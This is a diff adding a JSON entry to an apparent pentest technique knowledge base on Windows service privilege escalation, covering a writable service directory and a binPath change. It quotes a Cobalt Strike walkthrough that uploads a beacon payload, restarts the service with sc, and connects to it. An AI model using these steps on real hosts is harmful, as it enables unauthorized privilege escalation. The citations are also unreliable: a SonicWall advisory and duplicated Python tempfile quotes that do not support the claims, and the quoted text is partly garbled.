@@ -1,0 +1,96 @@
+{
+ "class_id": "file_upload",
+ "items": [
+  {
+   "item_key": "file_upload.technique.tested_now_let_s_see_our_permissions_on_i",
+   "kind": "technique",
+   "claim": "A Windows service whose binary directory is writable by the current principal lets a tester drop a replacement executable into that directory and have the service start it after a stop/start cycle.",
+   "body": "A Windows service whose binary directory is writable by the current principal lets a tester drop a replacement executable into that directory and have the service start it after a stop/start cycle.\n\nHackTricks reference: 151098c3 (notion:151098c3-95c5-8060-be35-c392789893fc)",
+   "disproof": "The directory ACL denies write to the current principal, or the service keeps loading a binary at a path other than the uploaded one, so the uploaded file never runs.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#151098c3-95c5-8060-be35-c392789893fc",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "Now let\u2019s see our permissions on it\n\npowershell Get-Acl -Path \"C:\\Program Files\\Vulnerable Services\" | fl\n\nimage.png\n\nas we see we can create files!\n\nwe can automate the process usin sharpup!\n\nexecute-assembly C:\\Tools\\SharpUp\\SharpUp\\bin\\Release\\SharpUp.exe audit UnquotedServicePath\n\nimage.png\n\nNow let\u2019s enerate payloads usin Cobalt Strike.\n\nimage.png\n\nNotice that it\u2019s TCP Beacon (Rasta Recommended Usin TCP Beacons While Local PrivEsc)\n\nNow let\u2019s generate the payload.\n\nimage.png\n\nimage.png\n\nNow let\u2019s upload it.\n\n upload c:\\Payloads\\Service.exe\n\nimage.png\n\nimage.png\n\nNow let\u2019s stop the service.\n\nrun sc stop VulnService1\n\nimage.png\n\nNow let\u2019s start it again.\n\nrun sc start VulnService1\n\nimage.png\n\n port 4444http://localhostalocalhostNow let\u2019s check if our payload is lestning on the \n\nrun netstat -anp tcp\n\nimage.png\n\nlet\u2019s go now let\u2019s connec to the TCP Beacon.\n\nconnect 127.0.0.1 4444\n\nimage.png\n\nlet\u2019s goooooooo!"
+    },
+    {
+     "url": "https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/",
+     "source_type": "research",
+     "host": "www.nccgroup.com",
+     "publisher": "nccgroup.com",
+     "quote": "Whilst the file extension cannot be controlled (due to the timestamp being appended), the attacker can write files to arbitrary folders, with a partly controlled file name."
+    },
+    {
+     "url": "https://docs.python.org/3/library/tempfile.html",
+     "source_type": "research",
+     "host": "docs.python.org",
+     "publisher": "python.org",
+     "quote": "All the user-callable functions and constructors take additional arguments which allow direct control over the location and name of temporary files and directories."
+    },
+    {
+     "url": "https://docs.python.org/3/library/tempfile.html",
+     "source_type": "research",
+     "host": "docs.python.org",
+     "publisher": "python.org",
+     "quote": "All the user-callable functions and constructors take additional arguments which allow direct control over the location and name of temporary files and directories."
+    }
+   ]
+  },
+  {
+   "item_key": "file_upload.variant.tested_upload_new_service_file_upload_c",
+   "kind": "variant",
+   "claim": "When the service binary cannot be overwritten in place but the service configuration can be changed, repointing the service's binPath at an uploaded executable makes the service host the attacker's file instead.",
+   "body": "When the service binary cannot be overwritten in place but the service configuration can be changed, repointing the service's binPath at an uploaded executable makes the service host the attacker's file instead.\n\nHackTricks reference: 151098c3 (notion:151098c3-95c5-8060-be35-c392789893fc)",
+   "disproof": "The binPath change is rejected or the query still reports the original executable, so the uploaded file is never loaded by the service.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#151098c3-95c5-8060-be35-c392789893fc",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "Upload new service file.\n\nupload C:\\Payloads\\Service.exe\n\nimage.png\n\nnow let\u2019s chane the Bin Path.\n\nrun sc config VulnService2 binPath= C:\\Temp\\Service.exe\n\nimage.png\n\nNow let\u2019s query the service to validate.\n\nrun sc qc VulnService2\n\nimage.png\n\nNow let\u2019s stop the service.\n\nrun sc stop VulnService2\n\nimage.png\n\nNow let\u2019s start the service.\n\nrun sc start VulnService2\n\nimage.png\n\nNow let\u2019s check if our fake service lestnin on the local host\n\nrun netstat -anp tcp\n\nimage.png\n\nyes we are good to go\n\nNow let\u2019s connect to the service.\n\nconnect 127.0.0.1 4444\n\nimage.png\n\nas we see we did it!"
+    },
+    {
+     "url": "https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/",
+     "source_type": "research",
+     "host": "www.nccgroup.com",
+     "publisher": "nccgroup.com",
+     "quote": "Whilst the file extension cannot be controlled (due to the timestamp being appended), the attacker can write files to arbitrary folders, with a partly controlled file name."
+    },
+    {
+     "url": "https://docs.python.org/3/library/tempfile.html",
+     "source_type": "research",
+     "host": "docs.python.org",
+     "publisher": "python.org",
+     "quote": "All the user-callable functions and constructors take additional arguments which allow direct control over the location and name of temporary files and directories."
+    },
+    {
+     "url": "https://docs.python.org/3/library/tempfile.html",
+     "source_type": "research",
+     "host": "docs.python.org",
+     "publisher": "python.org",
+     "quote": "All the user-callable functions and constructors take additional arguments which allow direct control over the location and name of temporary files and directories."
+    }
+   ]
+  }
+ ],
+ "publishers": [
+  "nccgroup.com",
+  "python.org",
+  "source-guide"
+ ],
+ "sources": [
+  "https://tested-corleggy-562.notion.site/?pvs=4#151098c3-95c5-8060-be35-c392789893fc",
+  "https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/",
+  "https://docs.python.org/3/library/tempfile.html",
+  "https://docs.python.org/3/library/tempfile.html",
+  "https://tested-corleggy-562.notion.site/?pvs=4#151098c3-95c5-8060-be35-c392789893fc",
+  "https://www.nccgroup.com/research/technical-advisory-sonicwall-sma-100-series-unauthenticated-file-upload-path-traversal-cve-2021-20040/",
+  "https://docs.python.org/3/library/tempfile.html",
+  "https://docs.python.org/3/library/tempfile.html"
+ ]
+}
